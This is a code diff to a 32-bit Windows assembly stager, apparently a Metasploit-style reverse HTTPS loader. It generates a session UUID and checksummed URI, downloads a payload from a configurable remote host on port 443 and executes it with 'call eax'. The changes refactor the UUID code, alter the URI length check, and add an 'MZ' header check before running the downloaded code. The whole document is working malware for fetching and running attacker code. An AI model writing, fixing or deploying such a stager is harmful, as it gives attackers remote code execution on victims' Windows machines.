@@ -18,47 +18,41 @@ extern CryptBinaryToStringA
 segment .data
 Host db 'samplehost.example.com',0     ;replace this with your RHOST
 Port dw  443                           ;replace this with your RPORT
-UUID times 75 db 0
-base64URI times 100 db 0
-lowTime db 0
-highTime db 0
+
+segment .bss
+    UUID resb 75
+    base64URI resb 100
+    lowTime resd 1
+    highTime resd 1
+
 
 segment .text
 
 global Start
 Start:
 .genUUID:           ;generate the UUID
-    mov ebx,UUID    ;Move the location that we will store the UUID into ebx
-    rdrand eax      ;Read a random number to eax
-    mov [ebx],eax   ;The first eight bytes of a UUID are the PUID which in our case will be random, move the random bytes we just made, to the start of the UUID
-    add ebx,4       ;Move the pointer in EBX ahead 4 bytes
-    rdrand eax      ;Generate 4 new random bytes for the rest of the PUID
-    mov [ebx],eax   ;Append the next four bytes to the UUID
-    add ebx,4       ;Move the pointer in EBX ahead 4 bytes
-    rdrand eax      ;Now we need some random numbers for the architecture and platform XOR values
-    mov[ebx],ax     ;Move the lower two bytes to the UUID, these are the architecture and platform XOR values
-    add ebx,2       ;Increment the UUID pointer two bytes
-    xor ecx,ecx     ;Clear ecx
-    mov cl,ah       ;Move the high byte of ax to the low byte of cx so we can use it to xor the architecture value
-    xor ecx,1       ;XOR the architecture (1: 32 bit) with the architecture XOR key
-    mov [ebx],cl    ;Copy the XORed architecture to the UUID
-    inc ebx         ;Increment the pointer to the UUID
-    xor ecx,ecx     ;Clear eax again to prepare for xoring the platform
-    mov cl,al       ;Copy the low byte of ax to the low byte of cx to perform the xor for our platform
-    xor ecx,1       ;XOR the platform (1: windows) with the platform XOR key
-    mov [ebx],cl    ;Add the result to the end of the uuid
-    inc ebx         ;Increment the UUID pointer
-    mov ecx,[ebx-6] ;Copy the architecture key, followed by the platform key followed by the values to ecx, we need these to make the timestamp xor key
-    mov cx,[ebx-4]  ;Copy the architecture key, followed by the platform key to cx, we should now have a timestamp xor key, but backwards
-    bswap ecx       ;Reverse the order of ecx, we now have platform XOR, architecture XOR, platform XOR, architecture XOR in ECX
-    push ebx        ;Push values we need to save for after our syscall to the stack
-    push ecx
-    push lowTime    ;Push the pointer to our FILETIME structure to the stack
+    nop
+    rdrand eax          ;Read a random number to eax
+    mov [UUID],eax      ;The first eight bytes of a UUID are the PUID which in our case will be random, move the random bytes we just made, to the start of the UUID
+    rdrand eax          ;Generate 4 new random bytes for the rest of the PUID
+    mov [UUID+4],eax    ;Append the next four bytes to the UUID
+    rdrand eax          ;Now we need some random numbers for the architecture and platform XOR values
+    mov[UUID+8],ax      ;Move the lower two bytes to the UUID, these are the architecture and platform XOR values
+    xor ecx,ecx         ;Clear ecx
+    mov cl,ah           ;Move the high byte of ax to the low byte of cx so we can use it to xor the architecture value
+    xor ecx,1           ;XOR the architecture (1: 32 bit) with the architecture XOR key
+    mov [UUID+10],cl    ;Copy the XORed architecture to the UUID
+    xor ecx,ecx         ;Clear eax again to prepare for xoring the platform
+    mov cl,al           ;Copy the low byte of ax to the low byte of cx to perform the xor for our platform
+    xor ecx,1           ;XOR the platform (1: windows) with the platform XOR key
+    mov [UUID+11],cl    ;Add the result to the end of the uuid
+    mov ebx,[UUID+6]    ;Copy the architecture key, followed by the platform key followed by the values to ebx, we need these to make the timestamp xor key
+    mov bx,[UUID+8]     ;Copy the architecture key, followed by the platform key to bx, we should now have a timestamp xor key, but backwards
+    bswap ebx           ;Reverse the order of ebx, we now have platform XOR, architecture XOR, platform XOR, architecture XOR in EBX
+    push lowTime        ;Push the pointer to our FILETIME structure to the stack
     call [GetSystemTimeAsFileTime]      ;Call this function to get the current time, the dwHighDateTime value will be our timestamp
-    pop ecx         ;Recover the values we saved before our syscall
-    pop ebx
-    xor ecx,[highTime]  ;XOR the dwHighDateTime value with our timestamp xor key
-    mov [ebx],ecx   ;Append the timestamp XORed value to the uuid, this completes our 16 byte UUID
+    xor ebx,[highTime]  ;XOR the dwHighDateTime value with our timestamp xor key
+    mov [UUID+12],ebx   ;Append the timestamp XORed value to the uuid, this completes our 16 byte UUID
 
 .base64E:
     push UUID       ;Push the UUID pointer to get the string length
@@ -145,7 +139,7 @@ Start:
     mov BYTE [eax], cl  ;Copy the random byte to the end of the URI
     push base64URI      ;Push the new URI
     call .strlen        ;Get the string length to ensure it is larger than required
-    cmp eax,34
+    cmp eax,26
     jle .appendRandom   ;If it is still less than we need, append another character
     jmp .URIChecksum    ;Otherwise go back to the checksum to see if the URI is valid
 
@@ -267,6 +261,13 @@ mov ecx,0           ;Current attempt
     add ecx,[ebx]   ;Add bytes read to the heap pointer
     cmp DWORD [ebx],1024    ;If the bytes read are less than the max, then we've hit the end of the file so we can leave the loop
     je .loop
+    
+.testCode:
+    mov bx,[eax]    ;Copy the first two bytes of (hopefully) shellcode to bx
+    cmp bl,0x4d     ;Compare the first byte to "M"
+    jne .exit       ;If it isn't, exit
+    cmp bh,0x5a     ;Compare the second byte to "Z"
+    jne .exit       ;All windows shellcode will start with MZ, so if we don't have that we probably shouldn't try to run it
     
 .run:
     call eax        ;Call our downloaded shellcode
